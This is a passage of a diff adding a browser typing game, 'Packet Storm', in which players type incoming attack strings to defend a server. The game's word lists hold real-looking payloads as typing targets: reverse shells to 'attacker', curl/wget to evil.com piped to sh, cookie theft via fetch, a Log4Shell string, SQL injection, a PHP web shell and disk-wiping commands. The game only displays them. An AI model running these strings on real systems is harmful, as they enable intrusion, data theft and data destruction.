@@ -1,0 +1,1275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>PACKET STORM</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:'Share Tech Mono',monospace;color:#0f0;-webkit-tap-highlight-color:transparent}
+canvas{display:block;position:absolute;top:0;left:0;width:100%;height:100%}
+#ui-layer{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10}
+#typing-area{position:absolute;bottom:0;left:0;width:100%;pointer-events:auto;z-index:20}
+#target-display{width:100%;padding:6px 16px;background:rgba(0,20,0,0.95);border-top:1px solid #050;color:#0a0;font-family:'Share Tech Mono',monospace;font-size:14px;text-align:center;display:none;letter-spacing:1px}
+#target-display .target-text{color:#0f0;font-weight:bold}
+#target-display .target-matched{color:#000;background:#0f0;padding:0 1px}
+#typing-input{width:100%;padding:12px 16px 12px 32px;background:rgba(0,20,0,0.92);border:none;border-top:2px solid #0a0;color:#0f0;font-family:'Share Tech Mono',monospace;font-size:18px;outline:none;caret-color:#0f0;letter-spacing:1px}
+#typing-input::placeholder{color:#050}
+#typing-input:focus{border-top-color:#0f0}
+.prompt-symbol{position:absolute;bottom:12px;left:8px;color:#0a0;font-size:18px;z-index:21;pointer-events:none}
+
+/* Scanline overlay */
+#scanlines{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:5;
+background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px);
+}
+
+/* Screen flash */
+#flash{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:15;background:transparent;transition:background 0.05s}
+#flash.hit{background:rgba(0,255,0,0.08)}
+#flash.damage{background:rgba(255,0,0,0.12)}
+
+/* HUD */
+#hud{position:absolute;top:0;left:0;width:100%;padding:8px 14px;display:flex;justify-content:space-between;align-items:flex-start;z-index:12;pointer-events:none;font-size:13px}
+#hud-left,#hud-right{display:flex;flex-direction:column;gap:4px}
+#hud-right{align-items:flex-end}
+.hud-label{color:#050;font-size:11px;text-transform:uppercase;letter-spacing:2px}
+.hud-value{color:#0f0;font-size:16px}
+.hud-value.combo{color:#ff0;text-shadow:0 0 8px #ff0}
+.hud-value.danger{color:#f44;text-shadow:0 0 8px #f44;animation:pulse 0.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+
+/* Menu screens */
+.menu-screen{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:30;background:rgba(0,0,0,0.95);pointer-events:auto}
+.menu-screen.hidden{display:none}
+.menu-title{font-size:clamp(28px,6vw,52px);color:#0f0;text-shadow:0 0 20px #0f0,0 0 40px #0a0;margin-bottom:8px;letter-spacing:4px}
+.menu-subtitle{font-size:clamp(12px,2.5vw,16px);color:#0a0;margin-bottom:30px;letter-spacing:2px}
+.menu-btn{background:transparent;border:2px solid #0a0;color:#0f0;font-family:'Share Tech Mono',monospace;font-size:clamp(14px,2.5vw,18px);padding:12px 32px;margin:6px;cursor:pointer;letter-spacing:2px;transition:all 0.15s;pointer-events:auto;min-width:220px;text-align:center}
+.menu-btn:hover,.menu-btn:focus{background:#0a0;color:#000;text-shadow:none;box-shadow:0 0 15px #0a0;outline:none}
+.menu-btn.daily{border-color:#ff0;color:#ff0}
+.menu-btn.daily:hover{background:#ff0;color:#000;box-shadow:0 0 15px #ff0}
+.menu-info{font-size:12px;color:#050;margin-top:20px;text-align:center;line-height:1.6}
+.menu-stats{display:flex;gap:30px;margin:16px 0;flex-wrap:wrap;justify-content:center}
+.stat-box{text-align:center}
+.stat-val{font-size:22px;color:#0f0}
+.stat-lbl{font-size:10px;color:#050;letter-spacing:2px}
+
+/* Upgrade shop */
+#shop-screen .menu-title{font-size:clamp(22px,4.5vw,36px);margin-bottom:16px}
+.upgrades-grid{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;max-width:700px;padding:0 10px;margin-bottom:16px}
+.upgrade-card{border:1px solid #0a0;padding:12px;width:clamp(140px,30vw,200px);text-align:center;cursor:pointer;transition:all 0.15s;pointer-events:auto;position:relative}
+.upgrade-card:hover{border-color:#0f0;box-shadow:0 0 10px rgba(0,255,0,0.3)}
+.upgrade-card.owned{border-color:#050;opacity:0.5;cursor:default}
+.upgrade-card.owned::after{content:'INSTALLED';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#0a0;font-size:11px;letter-spacing:2px;background:rgba(0,0,0,0.8);padding:4px 8px}
+.upgrade-name{color:#0f0;font-size:14px;margin-bottom:4px}
+.upgrade-desc{color:#050;font-size:10px;margin-bottom:8px;line-height:1.4}
+.upgrade-cost{color:#ff0;font-size:13px}
+.xp-display{font-size:18px;color:#ff0;margin-bottom:14px;text-shadow:0 0 8px #ff0}
+
+/* Game over overlay */
+#gameover-screen .menu-title{color:#f44;text-shadow:0 0 20px #f44,0 0 40px #a00}
+.xp-earned{font-size:20px;color:#ff0;margin:10px 0;text-shadow:0 0 10px #ff0}
+.final-score{font-size:28px;color:#0f0;margin:6px 0}
+.wave-reached{font-size:14px;color:#0a0}
+.new-record{color:#ff0;font-size:14px;animation:pulse 0.6s infinite}
+
+/* Toast */
+.toast{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:clamp(20px,5vw,36px);color:#0f0;text-shadow:0 0 20px #0f0;z-index:25;pointer-events:none;animation:toastAnim 1.2s forwards;white-space:nowrap}
+.toast.gold{color:#ff0;text-shadow:0 0 20px #ff0}
+.toast.multi{color:#f0f;text-shadow:0 0 20px #f0f}
+.toast.boss{color:#f44;text-shadow:0 0 20px #f44}
+@keyframes toastAnim{0%{opacity:1;transform:translate(-50%,-50%) scale(1)}50%{opacity:1;transform:translate(-50%,-80%) scale(1.15)}100%{opacity:0;transform:translate(-50%,-120%) scale(0.9)}}
+
+/* Mobile keyboard trigger */
+#mobile-kb-trigger{display:none;position:absolute;bottom:50px;left:50%;transform:translateX(-50%);z-index:25;pointer-events:auto}
+@media(max-width:768px){
+  #typing-input{font-size:16px;padding:10px 16px 10px 28px}
+  .prompt-symbol{font-size:16px;bottom:10px;left:6px}
+  #hud{font-size:11px;padding:6px 10px}
+  .hud-value{font-size:14px}
+  #target-display{font-size:12px;padding:4px 12px}
+}
+</style>
+</head>
+<body>
+
+<canvas id="game-canvas"></canvas>
+<div id="scanlines"></div>
+<div id="flash"></div>
+
+<div id="hud">
+  <div id="hud-left">
+    <div><span class="hud-label">WAVE </span><span class="hud-value" id="hud-wave">1</span><span class="hud-value" id="hud-wave-name"></span></div>
+    <div><span class="hud-label">SCORE </span><span class="hud-value" id="hud-score">0</span></div>
+    <div><span class="hud-label">COMBO </span><span class="hud-value combo" id="hud-combo">x1</span></div>
+  </div>
+  <div id="hud-right">
+    <div><span class="hud-label">SERVER HP </span><span class="hud-value" id="hud-hp">100%</span></div>
+    <div><span class="hud-label">PACKETS </span><span class="hud-value" id="hud-packets">0</span></div>
+    <div><span class="hud-label">XP </span><span class="hud-value" id="hud-xp">0</span></div>
+  </div>
+</div>
+
+<div id="typing-area">
+  <div id="target-display">TARGET: <span id="target-text"></span></div>
+  <span class="prompt-symbol">$&gt;</span>
+  <input type="text" id="typing-input" placeholder="type to intercept..." inputmode="text" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" enterkeyhint="done">
+</div>
+
+<!-- TITLE SCREEN -->
+<div class="menu-screen" id="title-screen">
+  <div class="menu-title">PACKET STORM</div>
+  <div class="menu-subtitle">// FIREWALL DEFENSE SYSTEM //</div>
+  <div class="menu-stats">
+    <div class="stat-box"><div class="stat-val" id="title-highscore">0</div><div class="stat-lbl">HIGH SCORE</div></div>
+    <div class="stat-box"><div class="stat-val" id="title-bestwave">0</div><div class="stat-lbl">BEST WAVE</div></div>
+    <div class="stat-box"><div class="stat-val" id="title-xp">0</div><div class="stat-lbl">XP</div></div>
+  </div>
+  <button class="menu-btn" id="btn-start">[ START DEFENSE ]</button>
+  <button class="menu-btn daily" id="btn-daily">[ DAILY CHALLENGE ]</button>
+  <button class="menu-btn" id="btn-upgrades">[ UPGRADES ]</button>
+  <div class="menu-info">Type the packet contents to destroy incoming threats.<br>Protect your server at all costs.</div>
+</div>
+
+<!-- UPGRADE SHOP -->
+<div class="menu-screen hidden" id="shop-screen">
+  <div class="menu-title">SYSTEM UPGRADES</div>
+  <div class="xp-display">XP: <span id="shop-xp">0</span></div>
+  <div class="upgrades-grid" id="upgrades-grid"></div>
+  <button class="menu-btn" id="btn-shop-back">[ BACK ]</button>
+</div>
+
+<!-- GAME OVER -->
+<div class="menu-screen hidden" id="gameover-screen">
+  <div class="menu-title">BREACH DETECTED</div>
+  <div class="wave-reached">Wave <span id="go-wave">1</span> reached</div>
+  <div class="final-score" id="go-score">0</div>
+  <div class="xp-earned" id="go-xp">+0 XP</div>
+  <div class="new-record hidden" id="go-record">NEW HIGH SCORE!</div>
+  <div style="margin-top:16px">
+    <button class="menu-btn" id="btn-retry">[ RETRY ]</button>
+    <button class="menu-btn" id="btn-go-upgrades">[ UPGRADES ]</button>
+    <button class="menu-btn" id="btn-go-menu">[ MENU ]</button>
+  </div>
+</div>
+
+<!-- WAVE INTRO OVERLAY -->
+<div class="menu-screen hidden" id="wave-intro" style="background:rgba(0,0,0,0.85)">
+  <div class="menu-title" id="wave-intro-title" style="font-size:clamp(24px,5vw,42px)">WAVE 1</div>
+  <div class="menu-subtitle" id="wave-intro-sub"></div>
+</div>
+
+<script>
+// ==============================
+// PACKET STORM - Full Game
+// ==============================
+
+// --- Audio Engine (Web Audio API) ---
+const AudioEngine = (() => {
+  let ctx = null;
+  let muted = true; // muted by default
+  const init = () => { if(!ctx) ctx = new (window.AudioContext || window.webkitAudioContext)(); };
+  const play = (freq, type, dur, vol=0.15) => {
+    if(muted || !ctx) return;
+    try {
+      const o = ctx.createOscillator();
+      const g = ctx.createGain();
+      o.type = type;
+      o.frequency.setValueAtTime(freq, ctx.currentTime);
+      g.gain.setValueAtTime(vol, ctx.currentTime);
+      g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+      o.connect(g).connect(ctx.destination);
+      o.start(); o.stop(ctx.currentTime + dur);
+    } catch(e) {}
+  };
+  return {
+    init,
+    toggleMute: () => { init(); muted = !muted; return muted; },
+    isMuted: () => muted,
+    typeKey: () => play(800 + Math.random()*400, 'square', 0.04, 0.05),
+    destroy: () => { play(220, 'sawtooth', 0.15, 0.12); play(440, 'square', 0.1, 0.08); },
+    destroyGold: () => { play(523, 'square', 0.1, 0.15); play(659, 'square', 0.1, 0.12); play(784, 'square', 0.15, 0.15); },
+    destroyMulti: () => { play(300, 'sawtooth', 0.2, 0.15); play(600, 'sawtooth', 0.15, 0.1); },
+    bossDie: () => { play(150, 'sawtooth', 0.3, 0.18); play(200, 'square', 0.2, 0.12); play(100, 'sawtooth', 0.4, 0.15); },
+    hit: () => play(100, 'sawtooth', 0.3, 0.2),
+    combo: (n) => play(400 + n*100, 'square', 0.12, 0.1),
+    waveStart: () => { play(330, 'square', 0.15, 0.1); play(440, 'square', 0.15, 0.1); play(550, 'square', 0.2, 0.12); },
+    gameOver: () => { play(200, 'sawtooth', 0.4, 0.15); play(150, 'sawtooth', 0.5, 0.15); play(100, 'sawtooth', 0.7, 0.18); },
+    upgrade: () => { play(440, 'square', 0.1, 0.1); play(554, 'square', 0.1, 0.1); play(659, 'square', 0.15, 0.12); }
+  };
+})();
+
+// --- Constants ---
+const WAVE_NAMES = [
+  'SCRIPT KIDDIES', 'PORT SCANNERS', 'BRUTE FORCE', 'SQL INJECTION',
+  'XSS BARRAGE', 'PRIVILEGE ESCALATION', 'ROOTKIT STORM', 'ZERO-DAY BLITZ',
+  'APT ASSAULT', 'FULL SPECTRUM ATTACK'
+];
+
+const PACKETS_EASY = [
+  'ping','GET','syn','ack','dns','POST','PUT','HEAD','tcp','udp',
+  'ssh','ftp','http','smtp','pop3','imap','icmp','arp','ntp','snmp',
+  'telnet','curl','wget','nmap','dig','host','route','trace','whois','finger'
+];
+const PACKETS_MEDIUM = [
+  "SELECT * FROM","rm -rf /","eval(input)","DROP TABLE","chmod 777",
+  "sudo su","cat /etc/passwd","netcat -lvp","reverse shell","bind shell",
+  "buffer overflow","stack smash","heap spray","format string","race condition",
+  "UNION SELECT","OR 1=1 --","exec(decode(","base64 -d |","wget -O - |sh",
+  "crontab -e","iptables -F","dd if=/dev/zero","mkfs.ext4 /dev/sda",":(){ :|:& };:"
+];
+const PACKETS_HARD = [
+  "import os; os.system('rm -rf /')",
+  "<script>document.cookie<\/script>",
+  "'; DROP TABLE users; --",
+  "admin' OR '1'='1' --",
+  "<?php system($_GET['cmd']); ?>",
+  "powershell -enc UwB0AGEAcgB0",
+  "curl evil.com/shell.sh | bash",
+  "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
+  "msfvenom -p linux/x86/shell",
+  "nc -e /bin/bash attacker 4444",
+  "echo 'ssh-rsa AAAA' >> authorized_keys",
+  "find / -perm -4000 -exec ls -la {}",
+  "wget -qO- https://evil.com/miner | sh"
+];
+const PACKETS_BOSS = [
+  "1' UNION SELECT username,password FROM users WHERE '1'='1",
+  "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+  "'; EXEC xp_cmdshell('net user hacker P@ss /add'); --",
+  "{{constructor.constructor('return process')().mainModule.require('child_process').exec('id')}}",
+  "O:8:\"Exploit\":1:{s:4:\"code\";s:24:\"system('cat /etc/shadow')\";}",
+  "() { :; }; /bin/bash -c 'cat /etc/passwd'",
+  "${jndi:ldap://attacker.com/Exploit}",
+  "%{(#rt=#ctx['com.opensymphony.xwork2.dispatcher.HttpServletResponse'])}"
+];
+
+// --- Upgrade Definitions ---
+const UPGRADE_DEFS = [
+  { id:'ids', name:'IDS', desc:'Intrusion Detection System. Highlights next priority packet.', cost:100, icon:'[IDS]' },
+  { id:'rate_limiter', name:'Rate Limiter', desc:'Slows all packets by 15%.', cost:150, icon:'[RLM]' },
+  { id:'honeypot', name:'Honeypot', desc:'Decoy server absorbs 1 hit per wave.', cost:200, icon:'[HPT]' },
+  { id:'dpi', name:'Deep Packet Inspector', desc:'Shows packet threat type before visible.', cost:250, icon:'[DPI]' },
+  { id:'firewall_rule', name:'Firewall Rule', desc:'Auto-destroys 1 random easy packet per wave.', cost:175, icon:'[FWR]' },
+  { id:'overclock', name:'Overclock', desc:'Score multiplier +25% permanently.', cost:300, icon:'[OVC]' },
+  { id:'redundancy', name:'Redundancy', desc:'+20 max server HP.', cost:200, icon:'[RED]' },
+  { id:'ai_assist', name:'AI Assist', desc:'Auto-types first 2 chars of each packet.', cost:350, icon:'[AI]' }
+];
+
+// --- Save/Load ---
+const SAVE_KEY = 'packet_storm_save';
+function loadSave() {
+  try { return JSON.parse(localStorage.getItem(SAVE_KEY)) || {}; } catch(e) { return {}; }
+}
+function writeSave(data) {
+  const s = loadSave();
+  Object.assign(s, data);
+  localStorage.setItem(SAVE_KEY, JSON.stringify(s));
+}
+function getSave() {
+  const s = loadSave();
+  return {
+    highScore: s.highScore || 0,
+    bestWave: s.bestWave || 0,
+    xp: s.xp || 0,
+    totalGames: s.totalGames || 0,
+    upgrades: s.upgrades || [],
+    dailySeed: s.dailySeed || null,
+    dailyBest: s.dailyBest || 0,
+    muted: s.muted !== undefined ? s.muted : true
+  };
+}
+
+// --- Seeded RNG for daily ---
+function mulberry32(a) {
+  return function() {
+    a |= 0; a = a + 0x6D2B79F5 | 0;
+    var t = Math.imul(a ^ a >>> 15, 1 | a);
+    t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t;
+    return ((t ^ t >>> 14) >>> 0) / 4294967296;
+  };
+}
+function getDailySeed() {
+  const d = new Date();
+  return d.getFullYear() * 10000 + (d.getMonth()+1) * 100 + d.getDate();
+}
+
+// --- Canvas Setup ---
+const canvas = document.getElementById('game-canvas');
+const ctx2d = canvas.getContext('2d');
+let W, H, DPR;
+
+function resize() {
+  DPR = window.devicePixelRatio || 1;
+  W = window.innerWidth;
+  H = window.innerHeight;
+  canvas.width = W * DPR;
+  canvas.height = H * DPR;
+  ctx2d.setTransform(DPR, 0, 0, DPR, 0, 0);
+}
+window.addEventListener('resize', resize);
+resize();
+
+// --- Particle System ---
+let particles = [];
+function spawnParticles(x, y, color, count=12, speed=3) {
+  for(let i=0; i<count; i++) {
+    const angle = (Math.PI*2/count)*i + Math.random()*0.5;
+    const spd = speed * (0.5 + Math.random());
+    particles.push({
+      x, y,
+      vx: Math.cos(angle)*spd,
+      vy: Math.sin(angle)*spd,
+      life: 1,
+      decay: 0.015 + Math.random()*0.025,
+      color,
+      size: 2 + Math.random()*3
+    });
+  }
+}
+function updateParticles(dt) {
+  for(let i=particles.length-1; i>=0; i--) {
+    const p = particles[i];
+    p.x += p.vx;
+    p.y += p.vy;
+    p.life -= p.decay;
+    p.vx *= 0.97;
+    p.vy *= 0.97;
+    if(p.life <= 0) particles.splice(i, 1);
+  }
+}
+function drawParticles() {
+  for(const p of particles) {
+    ctx2d.globalAlpha = p.life;
+    ctx2d.fillStyle = p.color;
+    ctx2d.fillRect(p.x - p.size/2, p.y - p.size/2, p.size, p.size);
+  }
+  ctx2d.globalAlpha = 1;
+}
+
+// --- Screen Shake ---
+let shakeAmount = 0;
+let shakeDecay = 0.9;
+function addShake(amount) { shakeAmount = Math.min(shakeAmount + amount, 15); }
+
+// --- Toast System ---
+let toasts = [];
+function showToast(text, cls='') {
+  const el = document.createElement('div');
+  el.className = 'toast ' + cls;
+  el.textContent = text;
+  document.body.appendChild(el);
+  toasts.push(el);
+  setTimeout(() => { el.remove(); toasts = toasts.filter(t=>t!==el); }, 1200);
+}
+
+// --- Flash ---
+const flash = document.getElementById('flash');
+function doFlash(type) {
+  flash.className = type;
+  setTimeout(() => flash.className = '', 80);
+}
+
+// --- Game State ---
+let game = null;
+let gameMode = 'normal'; // 'normal' or 'daily'
+let rng = Math.random;
+let animFrame = null;
+let lastTime = 0;
+let inputEl = document.getElementById('typing-input');
+
+// --- Packet object ---
+function createPacket(text, type, wave, speedMul=1) {
+  const save = getSave();
+  const hasRateLimiter = save.upgrades.includes('rate_limiter');
+  const baseSpeed = 0.4 + wave * 0.12;
+  let speed = baseSpeed * speedMul * (0.85 + rng()*0.3);
+  if(hasRateLimiter) speed *= 0.85;
+
+  // Difficulty auto-adjust
+  if(game && game.recentAccuracy < 0.5) speed *= 0.8;
+  else if(game && game.recentAccuracy > 0.85) speed *= 1.1;
+
+  const colors = { easy:'#0f0', medium:'#ff0', hard:'#f44', boss:'#c0f', gold:'#ffd700', multi:'#f0f' };
+  const yPad = 80;
+  const y = yPad + rng() * (H - yPad*2 - 60);
+
+  return {
+    text,
+    type,
+    x: -10,
+    y,
+    speed,
+    width: 0, // computed on first draw
+    color: colors[type] || '#0f0',
+    alive: true,
+    hp: type === 'boss' ? 1 : 1,
+    matched: 0, // chars matched so far
+    highlighted: false,
+    autoTyped: false,
+    spawnTime: Date.now(),
+    flashTimer: 0
+  };
+}
+
+// --- Wave Config ---
+function getWaveConfig(wave) {
+  let packetCount, types, bossCount=0, spawnInterval;
+  if(wave <= 3) {
+    packetCount = 8 + wave * 3;
+    types = ['easy'];
+    spawnInterval = 2200 - wave*200;
+  } else if(wave <= 6) {
+    packetCount = 12 + wave * 2;
+    types = ['easy','medium'];
+    spawnInterval = 1800 - wave*100;
+  } else if(wave <= 9) {
+    packetCount = 15 + wave * 2;
+    types = ['easy','medium','hard'];
+    spawnInterval = 1500 - wave*50;
+  } else {
+    packetCount = 20 + wave * 2;
+    types = ['easy','medium','hard'];
+    spawnInterval = 1200;
+  }
+  if(wave >= 3) bossCount = 1;
+  if(wave >= 7) bossCount = 2;
+  if(wave === 10) bossCount = 3;
+  return { packetCount, types, bossCount, spawnInterval };
+}
+
+function pickPacketText(type) {
+  const pools = { easy:PACKETS_EASY, medium:PACKETS_MEDIUM, hard:PACKETS_HARD, boss:PACKETS_BOSS };
+  const pool = pools[type];
+  return pool[Math.floor(rng() * pool.length)];
+}
+
+// --- Upgrade Logic ---
+function hasUpgrade(id) {
+  return getSave().upgrades.includes(id);
+}
+
+// --- Main Game Init ---
+function initGame(daily=false) {
+  gameMode = daily ? 'daily' : 'normal';
+  rng = daily ? mulberry32(getDailySeed()) : Math.random;
+
+  const save = getSave();
+  const maxHP = 100 + (save.upgrades.includes('redundancy') ? 20 : 0);
+
+  game = {
+    wave: 1,
+    score: 0,
+    hp: maxHP,
+    maxHP: maxHP,
+    combo: 0,
+    maxCombo: 0,
+    comboMultiplier: 1,
+    packets: [],
+    spawnQueue: [],
+    spawnTimer: 0,
+    waveActive: false,
+    waveComplete: false,
+    waveCooldown: 0,
+    packetsDestroyed: 0,
+    packetsMissed: 0,
+    totalPacketsInWave: 0,
+    packetsSpawned: 0,
+    bossesLeft: 0,
+    recentHits: [],
+    recentAccuracy: 0.7,
+    honeypotActive: save.upgrades.includes('honeypot'),
+    honeypotUsed: false,
+    firewallRuleUsed: false,
+    paused: false,
+    started: false,
+    gameOver: false,
+    elapsedTime: 0,
+    goldTimer: 0,
+    multiTimer: 0,
+    idsTarget: null
+  };
+
+  particles = [];
+  shakeAmount = 0;
+  inputEl.value = '';
+  inputEl.focus();
+  updateHUD();
+  startWave(1);
+}
+
+function startWave(waveNum) {
+  game.wave = waveNum;
+  game.waveActive = false;
+  game.waveComplete = false;
+  game.packetsDestroyed = 0;
+  game.packetsMissed = 0;
+  game.packetsSpawned = 0;
+  game.honeypotUsed = false;
+  game.firewallRuleUsed = false;
+  game.spawnQueue = [];
+  game.idsTarget = null;
+
+  const cfg = getWaveConfig(waveNum);
+  game.totalPacketsInWave = cfg.packetCount + cfg.bossCount;
+  game.bossesLeft = cfg.bossCount;
+
+  // Build spawn queue
+  for(let i=0; i<cfg.packetCount; i++) {
+    let type;
+    if(cfg.types.length === 1) type = cfg.types[0];
+    else {
+      const r = rng();
+      if(cfg.types.includes('hard') && r < 0.2) type = 'hard';
+      else if(cfg.types.includes('medium') && r < 0.55) type = 'medium';
+      else type = 'easy';
+    }
+    // Random bonus packets (variable ratio reinforcement)
+    const bonusRoll = rng();
+    if(bonusRoll < 0.06) type = 'gold'; // ~6% gold
+    else if(bonusRoll < 0.09) type = 'multi'; // ~3% multi-kill
+
+    const text = type === 'gold' ? pickPacketText('easy') :
+                 type === 'multi' ? pickPacketText('easy') :
+                 pickPacketText(type);
+    game.spawnQueue.push({ text, type, delay: cfg.spawnInterval * (0.7 + rng()*0.6) });
+  }
+  // Add bosses near end
+  for(let i=0; i<cfg.bossCount; i++) {
+    game.spawnQueue.push({ text: pickPacketText('boss'), type: 'boss', delay: cfg.spawnInterval * 0.5 });
+  }
+
+  // Show wave intro
+  showWaveIntro(waveNum);
+}
+
+function showWaveIntro(w) {
+  const el = document.getElementById('wave-intro');
+  const title = document.getElementById('wave-intro-title');
+  const sub = document.getElementById('wave-intro-sub');
+  title.textContent = 'WAVE ' + w;
+  sub.textContent = WAVE_NAMES[w-1] || 'UNKNOWN THREAT';
+  el.classList.remove('hidden');
+  AudioEngine.waveStart();
+
+  setTimeout(() => {
+    el.classList.add('hidden');
+    game.waveActive = true;
+    game.spawnTimer = 0;
+    game.started = true;
+
+  }, 1800);
+}
+
+// --- Spawn Logic ---
+function updateSpawning(dt) {
+  if(!game.waveActive || game.spawnQueue.length === 0) return;
+
+  game.spawnTimer += dt * 1000;
+  const next = game.spawnQueue[0];
+  if(game.spawnTimer >= next.delay) {
+    game.spawnTimer = 0;
+    game.spawnQueue.shift();
+
+    const speedMul = gameMode === 'daily' ? 1.15 : 1;
+    const pkt = createPacket(next.text, next.type, game.wave, speedMul);
+
+    // AI Assist: pre-type first 2 chars
+    if(hasUpgrade('ai_assist') && !pkt.autoTyped && next.type !== 'boss') {
+      pkt.matched = Math.min(2, pkt.text.length);
+      pkt.autoTyped = true;
+    }
+
+    game.packets.push(pkt);
+    game.packetsSpawned++;
+
+    // IDS: highlight priority
+    if(hasUpgrade('ids')) {
+      updateIDSTarget();
+    }
+
+    // Firewall Rule: auto-destroy one easy packet per wave
+    if(hasUpgrade('firewall_rule') && !game.firewallRuleUsed && next.type === 'easy') {
+      game.firewallRuleUsed = true;
+      pkt.alive = false;
+      pkt.flashTimer = 0.3;
+      game.packetsDestroyed++;
+      spawnParticles(pkt.x + 20, pkt.y, '#0ff', 15, 4);
+      showToast('FIREWALL RULE: AUTO-BLOCK', '');
+    }
+  }
+}
+
+function updateIDSTarget() {
+  // Find the packet closest to the server (rightmost)
+  let closest = null;
+  let maxX = -1;
+  for(const p of game.packets) {
+    if(p.alive && p.x > maxX) { maxX = p.x; closest = p; }
+  }
+  game.packets.forEach(p => p.highlighted = false);
+  if(closest) closest.highlighted = true;
+  game.idsTarget = closest;
+}
+
+// --- Packet Update ---
+function updatePackets(dt) {
+  const serverX = W - 60;
+
+  for(let i=game.packets.length-1; i>=0; i--) {
+    const p = game.packets[i];
+    if(!p.alive) continue;
+
+    p.x += p.speed * dt * 60;
+    if(p.flashTimer > 0) p.flashTimer -= dt;
+
+    // Check if packet reached server
+    if(p.x + (p.width || 100) >= serverX) {
+      p.alive = false;
+      onPacketReachServer(p);
+    }
+  }
+
+  // Clean up dead packets
+  game.packets = game.packets.filter(p => p.alive || p.flashTimer > 0);
+}
+
+function onPacketReachServer(pkt) {
+  let damage;
+  switch(pkt.type) {
+    case 'boss': damage = 25; break;
+    case 'hard': damage = 15; break;
+    case 'medium': damage = 10; break;
+    default: damage = 5;
+  }
+
+  // Honeypot absorb
+  if(game.honeypotActive && !game.honeypotUsed) {
+    game.honeypotUsed = true;
+    game.honeypotActive = false;
+    showToast('HONEYPOT ABSORBED!', '');
+    spawnParticles(W-60, pkt.y, '#0f0', 20, 4);
+    return;
+  }
+
+  game.hp -= damage;
+  game.combo = 0;
+  game.comboMultiplier = 1;
+  game.packetsMissed++;
+  updateRecentAccuracy(false);
+  AudioEngine.hit();
+  addShake(damage > 10 ? 8 : 4);
+  doFlash('damage');
+  spawnParticles(W-60, pkt.y, '#f44', 15, 2);
+
+  if(game.hp <= 0) {
+    game.hp = 0;
+    endGame();
+  }
+  updateHUD();
+}
+
+// --- Typing / Matching ---
+function updateTargetDisplay(target) {
+  const td = document.getElementById('target-display');
+  const tt = document.getElementById('target-text');
+  if(!target) {
+    td.style.display = 'none';
+    return;
+  }
+  td.style.display = 'block';
+  const matched = target.text.substring(0, target.matched);
+  const remaining = target.text.substring(target.matched);
+  tt.innerHTML = '<span class="target-matched">' + escapeHtml(matched) + '</span>' + escapeHtml(remaining);
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function onInput() {
+  if(!game || game.gameOver || !game.waveActive) {
+    updateTargetDisplay(null);
+    return;
+  }
+
+  const typed = inputEl.value;
+  if(!typed) {
+    // Reset all matches
+    game.packets.forEach(p => { if(!p.autoTyped || p.matched <= 2) p.matched = p.autoTyped ? Math.min(2, p.text.length) : 0; });
+    updateTargetDisplay(null);
+    return;
+  }
+
+  AudioEngine.typeKey();
+
+  // Find best matching packet (case-insensitive, prioritize closest to server)
+  let bestMatch = null;
+  let bestMatchLen = 0;
+  let bestMatchX = -Infinity;
+
+  for(const p of game.packets) {
+    if(!p.alive) continue;
+    const target = p.text;
+    const baseOffset = p.autoTyped ? Math.min(2, target.length) : 0;
+    const compareText = p.autoTyped ? target.substring(0, baseOffset) + typed : typed;
+
+    if(target.toLowerCase().startsWith(compareText.toLowerCase())) {
+      const matchLen = compareText.length;
+      // Prefer: longest match first, then closest to server (highest x)
+      if(matchLen > bestMatchLen || (matchLen === bestMatchLen && p.x > bestMatchX)) {
+        bestMatchLen = matchLen;
+        bestMatch = p;
+        bestMatchX = p.x;
+      }
+    }
+  }
+
+  // Update match state
+  for(const p of game.packets) {
+    if(!p.alive) continue;
+    if(p === bestMatch) {
+      const baseOffset = p.autoTyped ? Math.min(2, p.text.length) : 0;
+      p.matched = baseOffset + typed.length;
+
+      // Check for full match
+      if(p.matched >= p.text.length) {
+        destroyPacket(p);
+        inputEl.value = '';
+        updateTargetDisplay(null);
+        return;
+      }
+    } else {
+      p.matched = p.autoTyped ? Math.min(2, p.text.length) : 0;
+    }
+  }
+
+  updateTargetDisplay(bestMatch);
+}
+
+function destroyPacket(pkt) {
+  pkt.alive = false;
+  pkt.flashTimer = 0.3;
+  game.packetsDestroyed++;
+  updateRecentAccuracy(true);
+
+  // Combo
+  game.combo++;
+  if(game.combo > game.maxCombo) game.maxCombo = game.combo;
+  if(game.combo >= 20) game.comboMultiplier = 8;
+  else if(game.combo >= 12) game.comboMultiplier = 4;
+  else if(game.combo >= 5) game.comboMultiplier = 2;
+  else game.comboMultiplier = 1;
+
+  // Score
+  let baseScore;
+  switch(pkt.type) {
+    case 'boss': baseScore = 500; break;
+    case 'hard': baseScore = 100; break;
+    case 'medium': baseScore = 50; break;
+    case 'gold': baseScore = 200; break;
+    case 'multi': baseScore = 30; break;
+    default: baseScore = 20;
+  }
+  const scoreMul = hasUpgrade('overclock') ? 1.25 : 1;
+  const idsMul = hasUpgrade('ids') ? 1.1 : 1;
+  const earned = Math.floor(baseScore * game.comboMultiplier * scoreMul * idsMul);
+  game.score += earned;
+
+  // Effects by type
+  if(pkt.type === 'gold') {
+    showToast('+' + earned + ' GOLD!', 'gold');
+    AudioEngine.destroyGold();
